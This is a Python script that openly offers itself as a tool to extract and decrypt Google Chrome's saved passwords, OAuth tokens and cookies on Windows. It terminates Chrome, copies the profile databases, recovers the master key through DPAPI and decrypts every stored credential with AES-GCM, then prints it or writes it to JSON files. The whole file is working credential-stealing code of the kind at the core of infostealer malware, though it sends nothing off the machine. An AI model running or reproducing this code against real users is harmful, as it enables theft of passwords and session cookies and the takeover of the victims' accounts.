# flake8: noqa

import argparse
import base64
import ctypes
import json
import logging
import os
import shutil
import sqlite3
import sys
import tempfile
import time
import traceback
from ctypes import wintypes
from datetime import datetime, timedelta

from Crypto.Cipher import AES


def create_token_file(token_file_path):
    """
    Creates the token file. If a directory is specified in the path, it creates
    the directory. If no directory is specified, it creates the file in the current directory.
    """
    directory = os.path.dirname(token_file_path)
    if directory:
        os.makedirs(directory, exist_ok=True)
    elif not os.path.isfile(token_file_path):
        # If no directory is specified and the file doesn't exist, create it in the current directory
        open(token_file_path, "w").close()


def write_token_file(chrome_tokens, token_file_path):
    """
    Writes the decrypted tokens to the specified file in JSON format.
    """
    with open(token_file_path, "w") as file:
        json.dump(chrome_tokens, file, indent=2)


def chrome_temp_copy(chrome_profile="Default"):
    """
    Copies the Chrome 'Web Data', 'Cookies', and 'Local State' files to a temporary directory.
    Accounts for the new Cookies file location in recent Chrome versions.
    """

    chrome_user_data = os.path.join(
        os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data"
    )

    if not os.path.exists(chrome_user_data):
        print(f"Chrome User Data directory not found at {chrome_user_data}")
        return ""

    temp_dir = tempfile.mkdtemp()

    files_to_copy = {
        "webd": os.path.join(chrome_user_data, chrome_profile, "Web Data"),
        "ld": os.path.join(chrome_user_data, chrome_profile, "Login Data"),
        "ldac": os.path.join(
            chrome_user_data, chrome_profile, "Login Data For Account"
        ),
        "ckeys": os.path.join(chrome_user_data, chrome_profile, "Network", "Cookies"),
        "lstate": os.path.join(chrome_user_data, "Local State"),
    }

    # Fallback path for Cookies in case of older Chrome versions
    cookies_fallback = os.path.join(chrome_user_data, chrome_profile, "Cookies")

    for file_name, src_path in files_to_copy.items():
        dst_path = os.path.join(temp_dir, file_name)

        if file_name == "Cookies" and not os.path.exists(src_path):
            print(f"New Cookies location not found, trying fallback location.")
            src_path = cookies_fallback

        if os.path.exists(src_path):
            try:
                shutil.copy2(src_path, dst_path)
                print(f"Successfully copied {file_name} from {src_path}")
            except PermissionError:
                print(
                    f"Permission denied when trying to copy {src_path}. Is Chrome running?"
                )
                time.sleep(2)
                try:
                    shutil.copy2(src_path, dst_path)
                    print(f"Successfully copied {file_name} from {src_path}")

                except PermissionError:
                    print(
                        f"Permission denied again when trying to copy {src_path}. Lock on Cookies file not released"
                    )
                continue
            except Exception as e:
                print(f"An error occurred while copying {src_path}: {str(e)}")
                continue
        else:
            print(f"Could not find the file: {src_path}")
            continue

    return temp_dir


def get_master_key_win(local_state_file):
    """
    Extracts and decrypts the master key from Chrome's 'Local State' file using DPAPI.

    Args:
    local_state_file (str): Path to the 'Local State' file.

    Returns:
    bytes: Decrypted master key, or None if an error occurs.
    """
    try:
        if not os.path.exists(local_state_file):
            print(f"Error: Local State file not found at {local_state_file}")
            return None

        with open(local_state_file, "r", encoding="utf-8") as file:
            local_state = json.load(file)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        if encrypted_key[:5] != b"DPAPI":
            print("Error: Unexpected encryption format in Local State file")
            return None

        return dpapi_decrypt(encrypted_key[5:])
    except json.JSONDecodeError:
        print(f"Error: Invalid JSON in Local State file {local_state_file}")
    except KeyError:
        print("Error: Required keys not found in Local State file")
    except Exception as e:
        print(f"Unexpected error in get_master_key_win: {str(e)}")
    return None


def dpapi_decrypt(data):
    """
    Decrypts data using Windows DPAPI.

    Args:
    data (bytes): Encrypted data to decrypt.

    Returns:
    bytes: Decrypted data, or None if decryption fails.
    """

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.c_uint32),
            ("pbData", ctypes.POINTER(ctypes.c_byte)),
        ]

    def blob_to_bytes(blob):
        return ctypes.string_at(blob.pbData, int(blob.cbData))

    try:
        blob_in = DATA_BLOB(
            len(data), (ctypes.c_byte * len(data)).from_buffer_copy(data)
        )
        blob_out = DATA_BLOB()

        if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            raise ctypes.WinError()

        return blob_to_bytes(blob_out)
    except Exception as e:
        print(f"Error in DPAPI decryption: {str(e)}")
        return None


def aes_gcm_decrypt(encrypted_data, key, nonce):
    """
    Decrypts AES-GCM encrypted data.

    Args:
    encrypted_data (bytes): Data to decrypt.
    key (bytes): Decryption key.
    nonce (bytes): Nonce used for encryption.

    Returns:
    bytes: Decrypted data, or None if decryption fails.
    """
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt(encrypted_data)[:-16]
    except ValueError as e:
        print(f"Error in AES-GCM decryption (incorrect parameters): {str(e)}")
    except Exception as e:
        print(f"Unexpected error in AES-GCM decryption: {str(e)}")
    return None


def parse_chromium_token(token_file, master_key):
    """
    Parses the 'Web Data' SQLite database, decrypts the tokens, and returns them.
    """
    tokens = []
    try:
        conn = sqlite3.connect(token_file)
        cursor = conn.cursor()
        cursor.execute("SELECT service, encrypted_token FROM token_service")

        for service, encrypted_token in cursor.fetchall():
            decrypted_token = aes_gcm_decrypt(
                encrypted_token[15:], master_key, encrypted_token[3:15]
            )
            try:
                token_str = decrypted_token.decode("utf-8")
            except UnicodeDecodeError:
                token_str = decrypted_token.decode("utf-8", errors="ignore")
            tokens.append({"Service": service, "Token": token_str})

        if not tokens:
            print("No tokens found. The database structure might have changed.")

    except sqlite3.Error as e:
        print(f"SQLite error occurred: {str(e)}")
    except Exception as e:
        print(f"An unexpected error occurred while parsing tokens: {str(e)}")
    finally:
        if "conn" in locals():
            conn.close()

    return tokens


def parse_chromium_cookies(cookie_file, master_key):
    """
    Parses the 'Cookies' SQLite database, decrypts the cookie values, and returns them.

    Args:
    cookie_file (str): Path to the Cookies SQLite file.
    master_key (bytes): Master key for decryption.

    Returns:
    list of dict: Parsed and decrypted cookies, or an empty list if an error occurs.
    """
    cookies = []
    conn = None
    try:
        if not master_key:
            raise ValueError("Master key is required for decryption")

        conn = sqlite3.connect(cookie_file)
        cursor = conn.cursor()
        cursor.execute(
            """SELECT host_key, name, encrypted_value, path, expires_utc, 
                          is_secure, is_httponly, creation_utc, last_access_utc
                          FROM cookies"""
        )

        rows = cursor.fetchall()
        logging.info(f"Found {len(rows)} cookies in the database")

        for row in rows:
            (
                host_key,
                name,
                encrypted_value,
                path,
                expires_utc,
                is_secure,
                is_httponly,
                creation_utc,
                last_access_utc,
            ) = row

            # Decrypt the cookie value
            if encrypted_value.startswith(b"v10"):
                decrypted_value = aes_gcm_decrypt(
                    encrypted_value[15:], master_key, encrypted_value[3:15]
                )
            elif encrypted_value.startswith(b"v20"):
                # logging.info(f"Encountered v20 encryption for {host_key}, {name}. Unable to decrypt.")
                decrypted_value = ""
            else:
                if encrypted_value:
                    # logging.warning(f"Using older decryption method for host key {host_key}")
                    decrypted_value = dpapi_decrypt(encrypted_value)
                else:
                    # logging.info(f"Empty encrypted value for {host_key}, {name}")
                    decrypted_value = ""

            if decrypted_value is None:
                # logging.warning(f"Failed to decrypt cookie {name} for {host_key}")
                decrypted_value = ""

            if decrypted_value:
                try:
                    decrypted_value = decrypted_value.decode("utf-8")
                except Exception as e:
                    logging.warning(
                        f"Error decoding value for {host_key}, {name}: {str(e)}. Setting to empty string."
                    )
                    decrypted_value = ""

            # Convert timestamps
            try:
                expires = datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)
                creation = datetime(1601, 1, 1) + timedelta(microseconds=creation_utc)
                last_access = datetime(1601, 1, 1) + timedelta(
                    microseconds=last_access_utc
                )
            except OverflowError as e:
                expires = creation = last_access = datetime(1970, 1, 1)

            cookies.append(
                {
                    "Host": host_key,
                    "Name": name,
                    "Value": decrypted_value,
                    "Path": path,
                    "Expires": expires.strftime("%Y-%m-%d %H:%M:%S"),
                    "Secure": bool(is_secure),
                    "HttpOnly": bool(is_httponly),
                    "Creation": creation.strftime("%Y-%m-%d %H:%M:%S"),
                    "LastAccess": last_access.strftime("%Y-%m-%d %H:%M:%S"),
                }
            )

        if not cookies:
            logging.warning("No cookies found or decrypted")

    except sqlite3.Error as e:
        logging.error(f"SQLite error occurred: {str(e)}")
    except ValueError as e:
        logging.error(str(e))
    except Exception as e:
        logging.error(f"An unexpected error occurred while parsing cookies: {str(e)}")
    finally:
        if conn:
            conn.close()

    return cookies


def parse_chrome_passwords(login_data_file, master_key):
    """
    Parses the 'Login Data' SQLite database, decrypts the passwords, and returns them.
    """
    passwords = []
    try:
        conn = sqlite3.connect(login_data_file)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            origin_url, username, encrypted_password = row
            if encrypted_password.startswith(b"v10"):
                nonce = encrypted_password[3:15]
                encrypted_data = encrypted_password[15:]
                decrypted_password = aes_gcm_decrypt(encrypted_data, master_key, nonce)
                try:
                    decrypted_password = decrypted_password.decode()
                except UnicodeDecodeError:
                    print(f"Error decrypting password for {origin_url}")
                    decrypted_password = decrypted_password.decode(errors="replace")
            elif encrypted_password.startswith(b"v20"):
                # logging.info(f"Encountered v20 encryption for {host_key}, {name}. Unable to decrypt.")
                decrypted_value = ""
            else:
                # Handle older encryption methods if necessary
                # decrypted_password = "Unable to decrypt (old format)"
                decrypted_password = dpapi_decrypt(encrypted_password)

            passwords.append(
                {
                    "URL": origin_url,
                    "Username": username,
                    "Password": decrypted_password,
                }
            )

        if not passwords:
            print("No password data found. The database structure might have changed.")

    except sqlite3.Error as e:
        print(f"SQLite error occurred: {str(e)}")
    except Exception as e:
        print(f"An unexpected error occurred while parsing passwords: {str(e)}")
    finally:
        if "conn" in locals():
            conn.close()

    return passwords


def terminate_process_smart(process_name):
    PROCESS_TERMINATE = 1
    PROCESS_QUERY_INFORMATION = 0x0400
    MAX_PATH = 260
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD),
            ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD),
            ("th32DefaultHeapID", wintypes.LPVOID),
            ("th32ModuleID", wintypes.DWORD),
            ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase", wintypes.LONG),
            ("dwFlags", wintypes.DWORD),
            ("szExeFile", wintypes.CHAR * MAX_PATH),
        ]

    processes = {}
    parent_pid = None

    try:
        hSnapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS, 0
        )
        if hSnapshot == -1:
            return False

        process_entry = PROCESSENTRY32()
        process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

        if ctypes.windll.kernel32.Process32First(
            hSnapshot, ctypes.byref(process_entry)
        ):
            while True:
                try:
                    pid = process_entry.th32ProcessID
                    ppid = process_entry.th32ParentProcessID
                    current_process_name = process_entry.szExeFile.decode(
                        "utf-8"
                    ).lower()

                    if process_name.lower() in current_process_name:
                        processes[pid] = ppid

                except Exception:
                    pass

                if not ctypes.windll.kernel32.Process32Next(
                    hSnapshot, ctypes.byref(process_entry)
                ):
                    break

    except Exception:
        return False
    finally:
        if "hSnapshot" in locals() and hSnapshot != -1:
            ctypes.windll.kernel32.CloseHandle(hSnapshot)

    # Find the parent process (the one that's not a child of any other matching process)
    for pid, ppid in processes.items():
        if ppid not in processes:
            parent_pid = pid
            break

    # If no parent is found among matching processes, find the one with the lowest PID
    if parent_pid is None and processes:
        parent_pid = min(processes.keys())

    if parent_pid:
        try:
            handle = ctypes.windll.kernel32.OpenProcess(
                PROCESS_TERMINATE, False, parent_pid
            )
            if handle:
                try:
                    if ctypes.windll.kernel32.TerminateProcess(handle, 1):
                        return True
                finally:
                    ctypes.windll.kernel32.CloseHandle(handle)
        except Exception:
            pass

    return True


def main():
    """
    Main function to handle command-line arguments, perform file operations, and decrypt Chrome tokens and cookies.
    """
    parser = argparse.ArgumentParser(
        description="Extract Chrome passwords, tokens, and cookies"
    )
    parser.add_argument(
        "--save-to-file",
        action="store_true",
        help="Save extracted data to files instead of printing to stdout",
    )
    parser.add_argument(
        "--passwords-file",
        default="passwords.json",
        help="Output path for extracted passwords",
    )
    parser.add_argument(
        "--tokens-file",
        default="tokens.json",
        help="Output path for extracted tokens",
    )
    parser.add_argument(
        "--cookies-file",
        default="cookies.json",
        help="Output path for extracted cookies",
    )
    parser.add_argument(
        "--chrome-profile",
        default="Default",
        help="Chrome profile name to extract from",
    )
    parser.add_argument(
        "--no-kill",
        action="store_true",
        help="Skip terminating chrome.exe before extraction",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable debug logging",
    )
    args = parser.parse_args()

    # Set up logging
    log_level = logging.DEBUG if args.debug else logging.INFO
    logging.basicConfig(
        level=log_level, format="%(asctime)s - %(levelname)s - %(message)s"
    )

    try:
        # Kill chrome before continuing (unless --no-kill)
        if not args.no_kill:
            terminated = terminate_process_smart("chrome.exe")
            if not terminated:
                print(
                    "Terminating chrome.exe failed! Copying Cookie file to temporary directory will likely fail!"
                )

        config_dir = chrome_temp_copy(chrome_profile=args.chrome_profile)
        if not config_dir:
            raise RuntimeError("Failed to create temporary directory for Chrome files")

        logging.info(
            f"Chrome files successfully copied to temporary directory: {config_dir}"
        )

        try:
            local_state_file_path = os.path.join(config_dir, "lstate")
            if not os.path.exists(local_state_file_path):
                raise FileNotFoundError(
                    f"Local State file not found: {local_state_file_path}"
                )

            chrome_master_key = get_master_key_win(local_state_file_path)
            if not chrome_master_key:
                raise ValueError("Failed to retrieve Chrome master key")

            web_data_path = os.path.join(config_dir, "webd")
            login_data_path = os.path.join(config_dir, "ld")
            login_data_account_path = os.path.join(config_dir, "ldac")
            cookies_path = os.path.join(config_dir, "ckeys")

            cookies, tokens, passwords1, passwords2 = [], [], [], []

            if os.path.exists(cookies_path):
                cookies = parse_chromium_cookies(cookies_path, chrome_master_key)
                logging.info("Cookies successfully decrypted")
            if os.path.exists(web_data_path):
                tokens = parse_chromium_token(web_data_path, chrome_master_key)
                logging.info("Tokens successfully decrypted")

            if os.path.exists(login_data_path):
                passwords1 = parse_chrome_passwords(login_data_path, chrome_master_key)
                logging.info("passwords 1 successfully decrypted")

            if os.path.exists(login_data_account_path):
                passwords2 = parse_chrome_passwords(
                    login_data_account_path, chrome_master_key
                )
                logging.info("passwords 2 decrypted")

            passwords = passwords1 + passwords2

            if args.save_to_file:
                save_data_to_file(passwords, args.passwords_file, "Passwords")
                save_data_to_file(tokens, args.tokens_file, "Tokens")
                save_data_to_file(cookies, args.cookies_file, "Cookies")
            else:
                print_data(passwords, "Passwords")
                print_data(tokens, "Tokens")
                print_data(cookies, "Cookies")

        except FileNotFoundError as e:
            logging.error(f"File not found: {str(e)}")
        except PermissionError as e:
            logging.error(f"Permission denied: {str(e)}")
        except Exception as e:
            logging.error(f"An unexpected error occurred: {str(e)}")
            logging.debug(traceback.format_exc())

    except Exception as e:
        logging.error(f"An unexpected error occurred: {str(e)}")
        logging.debug(traceback.format_exc())
    finally:
        if "config_dir" in locals() and config_dir:
            try:
                shutil.rmtree(config_dir)
                logging.info(
                    f"Temporary directory: {config_dir} cleaned up successfully."
                )
            except Exception as e:
                logging.error(f"Error cleaning up temporary directory: {str(e)}")


def save_data_to_file(data, file_path, data_type):
    """Helper function to save data to file"""

    if data and file_path:
        try:
            create_token_file(file_path)
            write_token_file(data, file_path)
            logging.info(
                f"{data_type} have been extracted and saved to {os.path.abspath(file_path)}"
            )
        except IOError as e:
            logging.error(f"Error saving {data_type} to file: {str(e)}")


def print_data(data, data_type):
    """Helper function to print data"""
    if data:
        print(f"\n{data_type}:")
        print(json.dumps(data, indent=2))


if __name__ == "__main__":
    main()
